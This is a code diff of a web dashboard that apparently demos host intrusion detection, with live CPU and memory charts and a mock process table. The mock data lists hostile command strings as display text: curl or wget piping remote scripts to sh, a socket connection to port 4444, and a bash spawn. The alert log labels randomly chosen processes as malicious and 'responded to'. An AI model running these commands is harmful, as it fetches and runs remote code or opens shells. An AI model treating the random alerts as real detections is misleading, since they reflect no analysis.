@@ -100,40 +100,22 @@
 
 <!-- 下方 row：CPU + 内存 -->
 <div class="row-container" style="margin-top: 20px; gap: 20px;">
-    <!-- 左边：PCIe & 其他指标折线图 -->
+
+
+    <!-- cpu占用折线图 -->
     <div class="col-md-6">
         <div class="window-container">
-            <div class="window-title">CPU HPC计数值</div>
-            <div style="display:flex; gap:25px; flex:1; height:350px;">
-            <!-- 左列 4 指标 -->
-                <div style="display:flex; flex-direction:column; gap:5px; flex:1;">
-                    <div class="cpu-window" id="hpc1" style="flex:1;"></div>
-                    <div class="cpu-window" id="hpc2" style="flex:1;"></div>
-                    <div class="cpu-window" id="hpc3" style="flex:1;"></div>
-                    <div class="cpu-window" id="hpc4" style="flex:1;"></div>
-                </div>
-            <!-- 右列 4 指标 -->
-                <div style="display:flex; flex-direction:column; gap:5px; flex:1;">
-                    <div class="cpu-window" id="hpc5" style="flex:1;height: 75px;"></div>
-                    <div class="cpu-window" id="hpc6" style="flex:1;"></div>
-                    <div class="cpu-window" id="hpc7" style="flex:1;"></div>
-                    <div class="cpu-window" id="hpc8" style="flex:1;"></div>
-                </div>
-            </div>
+            <div class="window-title">CPU利用率</div>
+            <div class="cpu-window" id="cpu-window" style="height:350px;"></div>
         </div>
-
     </div>
-
-
     <!-- 内存占用折线图 -->
     <div class="col-md-6">
         <div class="window-container">
             <div class="window-title">内存占用</div>
-            <div class="mem-window" id="memWindow" style="height:350px;"></div>
+            <div class="mem-window" id="mem-window" style="height:350px;"></div>
         </div>
     </div>
-<!-- 
-     style="height:350px;" -->
 
 
 </div>
@@ -310,10 +292,44 @@
     border-bottom: 2px solid #444;
 } */
 .top-window {
-    background-color: #ffffff; color: #0e0d0d;
+    background-color: #ffffff;
+    color: #0e0d0d;
     font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    padding: 15px; ; border-radius: 0 0 6px 6px;
-    width: 100%; height: 350px; white-space: pre; overflow: auto;
+    padding: 15px;
+    border-radius: 0 0 6px 6px;
+    width: 100%;
+    height: 350px;
+    white-space: pre;
+    overflow: auto;
+
+    /* 滚动条基础样式 */
+    scrollbar-width: thin;        /* Firefox: 细滚动条 */
+    scrollbar-color: #6c7cff33 #f1f1f1;  /* Firefox: 滑块颜色 | 背景色 */
+}
+
+/* Chrome / Edge / Safari */
+.top-window::-webkit-scrollbar {
+    width: 10px;                  /* 滚动条宽度 */
+    height: 10px;                 /* 横向滚动条高度 */
+}
+
+.top-window::-webkit-scrollbar-track {
+    background: #f1f1f1;          /* 滚动条轨道 */
+    border-radius: 5px;
+}
+
+.top-window::-webkit-scrollbar-thumb {
+    background: rgba(108, 124, 255, 0.3);  /* 滑块颜色 */
+    border-radius: 5px;
+    transition: background 0.3s;
+}
+
+.top-window::-webkit-scrollbar-thumb:hover {
+    background: rgba(108, 124, 255, 0.6);  /* 悬停效果 */
+}
+
+.top-window::-webkit-scrollbar-corner {
+    background: transparent;       /* 滚动条交叉角 */
 }
 .log-window {
     background-color: #262535; color: #dcdcdc;
@@ -325,8 +341,12 @@
 .proc-table th, .proc-table td, .log-table td { padding: 4px 14px; text-align: left; }
 .log-new { color: #ffffff; }
 .log-kill { color: #ff4b45; }
-.cpu-window { background-color: #edf0f7; border-radius: 0 0 6px 6px; border: 2px solid #444; }
-.mem-window { background-color: #edf0f7; border-radius: 0 0 6px 6px; }
+
+.cpu-window,
+.mem-window {
+    background-color: #edf0f7;
+    border-radius: 0 0 6px 6px;
+}
 
 /* 开关样式 */
 .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
@@ -347,166 +367,231 @@ input:checked + .slider:before { transform: translateX(26px); }
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-    let running = false;  // 是否运行刷新
+    let running = true;  // 是否运行刷新
     const toggle = document.getElementById("toggleRun");
-    toggle.addEventListener("change", (e) => { running = e.target.checked; });
 
+    if (toggle) {   // 
+        toggle.addEventListener("change", (e) => {
+            running = e.target.checked;
+        });
+    }
+    
     // ====== Top 窗口 & 日志 ======
     let prevProcesses = [
-        {pid: 2345, user: "root", cmd: "Xorg"},
-        {pid: 2891, user: "chenxi", cmd: "gnome-shell"},
-        {pid: 3124, user: "chenxi", cmd: "python3 -c 'import socket...'"},
-        {pid: 4012, user: "mysql", cmd: "/tmp/kworker"},
-        {pid: 5120, user: "www-data", cmd:  "curl http://evil/m.sh | sh"},
-        {pid: 6789, user: "chenxi", cmd: "/dev/shm/.x"},
+        {pid: 1012, user: "root", cmd: "/usr/lib/systemd/systemd"},
+        {pid: 1324, user: "root", cmd: "/usr/sbin/cron"},
+        {pid: 1589, user: "messagebus", cmd: "/usr/bin/dbus-daemon --system"},
+        {pid: 2033, user: "chenxi", cmd: "/usr/libexec/gnome-terminal-server"},
+        {pid: 2210, user: "chenxi", cmd: "/usr/bin/code"},
+
+        {pid: 3345, user: "root", cmd: "/tmp/systemd"},
+        {pid: 3521, user: "root", cmd: "/var/tmp/.sshd"},
+
+        {pid: 4120, user: "www-data", cmd: "bash -c curl -fsSL http://45.9.148.12/a.sh | sh"},
+        {pid: 4788, user: "chenxi", cmd: "s.connect((\"45.133.1.7\",4444))'"},
+        {pid: 5120, user: "www-data", cmd: "wget -qO- http://103.21.244.12/m.sh | sh"},
     ];
 
-    function generateTopOutput() {
-        let processes = [...prevProcesses];
-        if (processes.length < 10 && Math.random() < 0.4) {
-            const newPid = Math.floor(6000 + Math.random() * 2000);
-            const newProc = {pid: newPid, user: "chenxi", cmd: "python3"};
-            processes.push(newProc);
-            addLog(`新进程生成: PID=${newPid}, CMD=${newProc.cmd}，经过Agent智能体分析，暂无恶意风险`, "new");
-        }
-        if (processes.length > 5 && Math.random() < 0.3) {
-            const idx = Math.floor(Math.random() * processes.length);
-            const deadProc = processes.splice(idx, 1)[0];
-            addLog(`PID=${deadProc.pid}, CMD=${deadProc.cmd}，被Agent判定为恶意进程，已响应`, "kill");
-        }
-        prevProcesses = processes;
+    const normalCmds = [
+        "/usr/bin/ssh-agent",
+        "/usr/bin/gnome-shell",
+        "/usr/lib/systemd/systemd-logind",
+        "/usr/sbin/rsyslogd"
+    ];
 
+    const suspiciousCmds = [
+        "/tmp/.X11-unix/X1",
+        "/dev/shm/kworker",
+        "/var/tmp/systemd-helper"
+    ];
+
+    const maliciousCmds = [
+        "bash -c curl -fsSL http://185.234.219.12/b.sh | sh",
+        "python3 -c ';os.system(\"/bin/bash\")'",
+        "wget -qO- http://91.243.44.21/x | sh"
+    ];
+
+    // ====== 新增进程函数 ======
+    function addRandomProcess() {
+        if(prevProcesses.length >= 15) return; // 限制最大进程数
+
+        const newPid = Math.floor(6000 + Math.random() * 2000);
+        let cmdPool, type;
+
+        const r = Math.random();
+        if (r < 0.6) {
+            cmdPool = normalCmds;
+            type = "normal";
+        } else if (r < 0.85) {
+            cmdPool = suspiciousCmds;
+            type = "suspicious";
+        } else {
+            cmdPool = maliciousCmds;
+            type = "malicious";
+        }
+
+        const cmd = cmdPool[Math.floor(Math.random() * cmdPool.length)];
+        const newProc = {pid: newPid, user: "chenxi", cmd: cmd};
+        prevProcesses.push(newProc);
+
+        if (type === "normal") {
+            addLog(`新进程 PID=${newPid} (${cmd}) ，行为正常`, "info");
+        } else {
+            addLog(`高危进程 PID=${newPid} (${cmd})，已响应`, "alert");
+        }
+
+        // else if (type === "suspicious") {
+        //     addLog(`检测到可疑进程 PID=${newPid} (${cmd})，已进入监控`, "warn");
+        // } 
+    }
+
+    // ====== 生成进程表格 ======
+    function generateTopOutput() {
         let procStr = `<table class="proc-table">
             <thead>
                 <tr>
-                    <th>PID</th><th>USER</th><th>PR</th><th>NI</th>
-                    <th>VIRT</th><th>RES</th><th>SHR</th><th>S</th>
-                    <th>%CPU</th><th>%MEM</th><th>TIME+</th><th>COMMAND</th>
+                    <th>PID</th><th>USER</th>
+                    <th>%CPU</th><th>%MEM</th><th>COMMAND</th>
                 </tr>
             </thead>
             <tbody>`;
-        processes.forEach(p => {
-            const cpu = (Math.random() * 10).toFixed(1);
-            const mem = (Math.random() * 2).toFixed(1);
-            const time = `${Math.floor(Math.random()*10)}:${(Math.random()*59).toFixed(2)}`;
+        prevProcesses.forEach(p => {
+            const cpu = (Math.random() ).toFixed(1);
+            const mem = (Math.random() * 200).toFixed(1);
+            const time = `${Math.floor(Math.random()*10)}:${Math.floor(Math.random()*59).toString().padStart(2,'0')}`;
             procStr += `<tr>
-                <td>${p.pid}</td><td>${p.user}</td><td>20</td><td>0</td>
-                <td>165432</td><td>34128</td><td>18024</td><td>S</td>
-                <td>${cpu}</td><td>${mem}</td><td>${time}</td><td>${p.cmd}</td>
+                <td>${p.pid}</td><td>${p.user}</td>
+                <td>${cpu} %</td><td>${mem} MB</td><td>${p.cmd}</td>
             </tr>`;
         });
         procStr += `</tbody></table>`;
         return procStr;
     }
 
-    function refreshTop() { if(running) document.getElementById("topWindow").innerHTML = generateTopOutput(); }
+    // ====== 刷新函数 ======
+    function refreshTop() {
+        if(!running) return;
+
+        // 先可能生成新进程
+        if(Math.random() < 0.4) addRandomProcess();
+
+        // 再刷新进程窗口
+        document.getElementById("topWindow").innerHTML = generateTopOutput();
+    }
+
+    // ====== 日志函数 ======
     function addLog(msg, type) {
         const logList = document.querySelector("#logWindow .recent-alerts ul");
         if (!logList) return;
+
         const timeStr = new Date().toLocaleTimeString();
-        const colorClass = type === "new" ? "log-new" : type === "kill" ? "log-kill" : "";
+
+        const typeMap = { info: "log-info", warn: "log-warn", alert: "log-alert", kill: "log-kill" };
+        const iconMap = { info: "🟢", warn: "🟡", alert: "🔴", kill: "⚫" };
+
         const newItem = document.createElement("li");
-        newItem.innerHTML = `<span>[${timeStr}] ${msg}</span>`;
-        newItem.className = colorClass;
+        newItem.innerHTML = `<span>${iconMap[type] || ""} [${timeStr}] ${msg}</span>`;
+        newItem.className = typeMap[type] || "";
         logList.prepend(newItem);
+
         while (logList.children.length > 20) logList.removeChild(logList.lastChild);
     }
 
-    // ====== CPU & 内存折线图 ======
-    const cpuCharts = [];
-    const cpuDataArr = [];
-    const cpuIds = [
-        'hpc1',
-        'hpc2',
-        'hpc3',
-        'hpc4',
-        'hpc5',
-        'hpc6',
-        'hpc7',
-        'hpc8'
-    ];
-    const chartTitles = [
-        'LLC-stores',
-        'LLC-load-misses',
-        'bus-cycles',
-        'branches',
-        'LLC-store-misses',
-        'cache-misses',
-        'cache-references',
-        'dTLB-load-misses'
-    ];
     const timeWindow = 30;
     let labels = Array(timeWindow).fill('').map((_, i) => i - timeWindow + 1);
-    cpuIds.forEach((id, idx) => {
-        cpuCharts[idx] = echarts.init(document.getElementById(id));
-        cpuDataArr[idx] = Array(timeWindow).fill(0);
-        const option = {
-            title: {
-                text: chartTitles[idx],
-                left: 'left',
-                top: 'top',
-                textStyle: { color: '#252c42', fontSize: 12, fontWeight: 'bold' }
-            },
-            xAxis: { type: 'category', data: labels, boundaryGap: false, show: false },
-            yAxis: { type: 'value', max: 100, show: false },
-            series: [{
-                data: cpuDataArr[idx],
-                type: 'line',
-                smooth: true,
-                areaStyle: { color: 'rgba(195, 236, 250, 0.3)' },
-                lineStyle: { color: '#c3ecfa', width: 2 },
-            }],
-            grid: { left: '3%', right: '3%', top: '20%', bottom: '10%' }
-        };
-        cpuCharts[idx].setOption(option);
+
+    // ====== CPU & 内存折线图 ======
+    const cpuDom = document.getElementById('cpu-window');
+    const memDom = document.getElementById('mem-window');
+
+    if (!cpuDom || !memDom) {
+        console.error("DOM 没找到！");
+        return;
+    }
+
+    const cpuChart = echarts.init(cpuDom);
+    const memChart = echarts.init(memDom);
+
+    const cpuData = [];
+    const memData = [];
+    const timeData = [];
+
+    const maxPoints = 50;
+
+    // ===== CPU 图配置 =====
+    cpuChart.setOption({
+        title: { text: 'CPU (%)', left: 'center' },
+        xAxis: { type: 'category', data: timeData },
+        yAxis: { type: 'value', min: 0, max: 100 },
+        series: [{
+            type: 'line',
+            data: cpuData,
+            smooth: true,
+            areaStyle: {}
+        }]
     });
 
-    const memChart = echarts.init(document.getElementById('memWindow'));
-    let memData = Array(timeWindow).fill(0);
-    const memOption = {
-        xAxis: { type: 'category', data: labels, boundaryGap: false, show: false },
-        yAxis: { type: 'value', max: 100 },
+    // ===== 内存图配置 =====
+    memChart.setOption({
+        title: { text: 'Memory (%)', left: 'center' },
+        xAxis: { type: 'category', data: timeData },
+        yAxis: { type: 'value', min: 0, max: 100 },
         series: [{
-            data: memData,
             type: 'line',
+            data: memData,
             smooth: true,
-            areaStyle: { color: 'rgba(193, 149, 243, 0.3)' },
-            lineStyle: { color: '#c195f3', width: 2 },
-        }],
-        grid: { left: '3%', right: '3%', top: '10%', bottom: '10%' }
-    };
-    memChart.setOption(memOption);
+            areaStyle: {}
+        }]
+    });
 
-    function refreshCharts() {
-        if(!running) return;
+    async function fetchData() {
+        try {
+            const response = await fetch('/realtime/cpu/');
+            const data = await response.json();
 
-        // CPU 图表（保持原逻辑）
-        cpuCharts.forEach((chart, idx) => {
-            const newVal = (Math.random()*60).toFixed(1);
-            cpuDataArr[idx].push(newVal);
-            cpuDataArr[idx].shift();
-            chart.setOption({ series: [{ data: cpuDataArr[idx] }] });
-        });
+            const cpuValue = Number(data.cpu);
+            const memValue = Number(data.mem);
 
-        // 内存曲线优化
-        const lastMem = parseFloat(memData[memData.length - 1]); // 上一次值
-        // 模拟小幅度波动，-1~1% 或者 -2~2%
-        const delta = (Math.random() * 2 - 1);
-        let newMem = lastMem + delta;
+            if (isNaN(cpuValue) || isNaN(memValue)) {
+                console.error("NaN 数据:", data);
+                return;
+            }
 
-        // 保持在合理范围 20~80%（可根据实际内存调整）
-        if(newMem < 20) newMem = 20 + Math.random();
-        if(newMem > 80) newMem = 80 - Math.random();
+            const now = new Date().toLocaleTimeString();
 
-        newMem = newMem.toFixed(1);
-        memData.push(newMem);
-        memData.shift();
-        memChart.setOption({ series: [{ data: memData }] });
+            cpuData.push(cpuValue);
+            memData.push(memValue);
+            timeData.push(now);
+
+            if (cpuData.length > maxPoints) {
+                cpuData.shift();
+                memData.shift();
+                timeData.shift();
+            }
+
+            // 更新 CPU
+            cpuChart.setOption({
+                xAxis: { data: timeData },
+                series: [{ data: cpuData }]
+            });
+
+            // 更新 MEM
+            memChart.setOption({
+                xAxis: { data: timeData },
+                series: [{ data: memData }]
+            });
+
+        } catch (e) {
+            console.error("fetch error:", e);
+        }
     }
+
+    setInterval(fetchData, 1000);
+
 
 
     setInterval(refreshTop, 1000);
-    setInterval(refreshCharts, 1000);
+
 });
 </script>
 
